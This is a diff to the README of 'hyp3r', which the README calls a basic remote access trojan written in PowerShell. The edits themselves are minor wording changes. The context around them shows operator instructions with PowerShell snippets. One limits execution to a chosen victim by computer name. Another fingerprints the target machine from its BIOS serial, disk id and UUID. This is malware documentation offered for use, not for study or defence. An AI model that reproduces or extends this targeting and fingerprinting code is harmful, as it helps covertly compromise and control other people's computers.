@@ -1,6 +1,5 @@
 # hyp3r
 
-<hr>
 
 ### hyp3r is a basic RAT written in powershell.
 
@@ -70,7 +69,7 @@ if($env:COMPUTERNAME -eq "TARGET-PC") {
 	echo "now it will only be executed by targets with the user TARGET-PC"
 }
 ```
-  - If the COMPUTERNAME identifier is way to simple and it brings up problems you can use the scripts unique identifier composed of the biosid hddid and uuid of the target computer
+  - If the `COMPUTERNAME` identifier is way to simple for your needs and it brings up problems you can use the scripts unique identifier composed of the biosid hddid and uuid of the target computer
 
 ```powershell
 $a=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios=$a.split(' ')[2].Trim(); #bios id
